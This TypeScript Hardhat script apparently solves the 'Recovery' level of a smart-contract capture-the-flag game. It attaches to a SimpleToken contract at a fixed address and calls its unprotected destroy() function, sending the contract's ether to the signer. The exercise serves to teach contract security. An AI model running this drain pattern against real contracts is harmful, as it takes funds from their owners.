import { ethers } from "hardhat";
import { SimpleToken__factory } from "../typechain/factories/contracts/Recovery.sol/SimpleToken__factory";


async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address = "0x312597433A63F3dce31cA0a37ccC72dcc4E9A5ED";
    let simpleToken = new SimpleToken__factory(signer).attach(instance_address);
    console.log(await provider.getBalance(instance_address));


    let tx = await simpleToken.destroy(signer.address);
    await tx.wait();
    console.log(await provider.getBalance(instance_address));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
